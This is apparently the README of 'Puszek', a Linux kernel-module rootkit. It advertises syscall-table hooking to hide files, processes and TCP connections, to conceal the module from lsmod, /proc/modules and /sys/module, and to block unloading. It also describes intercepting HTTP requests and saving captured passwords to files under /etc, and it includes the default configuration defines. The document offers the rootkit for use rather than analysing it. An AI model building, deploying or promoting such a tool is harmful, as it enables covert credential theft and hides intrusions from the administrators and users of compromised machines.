# Puszek  

rootkit for linux, works by modifying syscall table, it's a kernel module  
  
### features:  
  
1. hiding files with names ending on defined suffix (`FILE_SUFFIX` - ".rootkit" by default)  
2. hiding processes which cmdline contains defined text (`COMMAND_CONTAINS` - ".//./" by default)  
examples:
```
.//./malicious_process
```

``` 
wget http://old-releases.ubuntu.com/releases/zesty/ubuntu-17.04-desktop-amd64.iso .//./
```
3. intercepting http requests.  
all intercepted GET and POST http requests will be writen to /etc/http_requests[FILE_SUFFIX]  
when password is sent in request - it's written additionally to /etc/passwords[FILE_SUFFIX]  
4. rootkit module is invisible in `lsmod` command, in file `/proc/modules`, and in directory `/sys/module/`  
5. unable to unload rootkit by `rmmod` command (if `UNABLE_TO_UNLOAD` is set)
6. hiding TCP connections of hidden processes  

### default configuration:  
is in rootkit.c  

```C
//beginning of the rootkit's configuration
#define FILE_SUFFIX ".rootkit"    	//hiding files with names ending on defined suffix
#define COMMAND_CONTAINS ".//./"    //hiding processes which cmdline contains defined text
#define ROOTKIT_NAME "rootkit"    	//you need to type here name of this module to make this module hidden
#define SYSCALL_MODIFY_METHOD PAGE_RW   //method of making syscall table writeable, CR0 or PAGE_RW
#define UNABLE_TO_UNLOAD 0
#define DEBUG 0                     //this is for me :)
//end of configuration
```

### tested on:  
```
Linux x 4.13.0-kali1-amd64 #1 SMP Debian 4.13.10-1kali2 (2017-11-08) x86_64 GNU/Linux
```
